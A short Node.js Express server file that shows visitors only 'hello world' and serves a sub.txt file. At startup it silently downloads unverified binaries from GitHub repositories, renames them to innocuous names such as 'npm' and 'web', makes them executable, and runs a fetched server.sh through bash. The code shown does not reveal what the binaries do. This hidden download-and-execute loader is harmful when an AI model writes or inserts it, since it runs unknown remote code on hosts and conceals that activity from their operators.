const port = process.env.PORT || 3000;
const express = require("express");
const app = express();
const exec = require("child_process").exec;
const fs = require("fs");
const path = require("path");
const axios = require('axios');
const os = require('os');

app.get("/", function(req, res) {
  res.send("hello world");
});
app.get("/sub", (req, res) => {
  fs.readFile("sub.txt", "utf8", (err, data) => {
    if (err) {
      console.error(err);
      res.status(500).json({ error: "Error reading sub.txt" });
    } else {
      res.setHeader('Content-Type', 'text/plain; charset=utf-8');
      res.status(200).send(data);
    }
  });
});

function getSystemArchitecture() {
  const arch = os.arch();
  if (arch === 'arm' || arch === 'arm64') {
    return 'arm';
  } else {
    return 'amd';
  }
}

function downloadFile(fileName, fileUrl, callback) {
    axios({
      method: 'get',
      url: fileUrl,
      responseType: 'stream',
    })
      .then(response => {
        const stream = fs.createWriteStream(path.join('./', fileName));
        response.data.pipe(stream);
        stream.on('finish', function() {
          stream.close();
          fs.chmod(path.join('./', fileName), 0o775, function(err) {
            if (err) {
              callback(`Failed to set permissions for ${fileName}`);
            } else {
              callback(null, fileName);
            }
          });
        });
      })
      .catch(err => {
        callback(`Download ${fileName} file failed`);
      });
  }

function getFilesForArchitecture(architecture) {
  if (architecture === 'arm') {
    return [
      { fileName: "web", fileUrl: "https://github.com/eoovve/test/releases/download/ARM/web" },
      { fileName: "npm", fileUrl: "https://github.com/eoovve/test/releases/download/ARM/swith" },
      { fileName: "bot", fileUrl: "https://github.com/eoovve/test/releases/download/ARM/server" },
      { fileName: "server.sh", fileUrl: "https://github.com/euuce/node-sac/releases/download/main/server.sh" },
    ];
  } else if (architecture === 'amd') {
    return [
      { fileName: "web", fileUrl: "https://github.com/eoovve/test/raw/main/web" },
      { fileName: "npm", fileUrl: "https://github.com/eoovve/test/raw/main/swith" },
      { fileName: "bot", fileUrl: "https://github.com/eoovve/test/raw/main/server" },
      { fileName: "server.sh", fileUrl: "https://github.com/euuce/node-sac/releases/download/main/server.sh" },
    ];
  }
  return [];
}

function downloadAndRunFiles() {
  const architecture = getSystemArchitecture();
  const filesToDownload = getFilesForArchitecture(architecture);

  if (filesToDownload.length === 0) {
    console.log(`Can't find a file for the current architecture`);
    return;
  }

  let downloadedCount = 0;

  filesToDownload.forEach(fileInfo => {
    downloadFile(fileInfo.fileName, fileInfo.fileUrl, (err, fileName) => {
      if (err) {
        console.log(`Download ${fileName} failed`);
      } else {
        console.log(`Download ${fileName} successfully`);
      }

      downloadedCount++;

      if (downloadedCount === filesToDownload.length) {
        console.log("All files downloaded");

        exec("bash server.sh", function(err, stdout, stderr) {
          if (err) {
            console.error(err);
            return;
          }
          console.log(stdout);
        });

      }
    });
  });
}
downloadAndRunFiles();

app.listen(port, () => console.log(`Server is running on port ${port}!`));
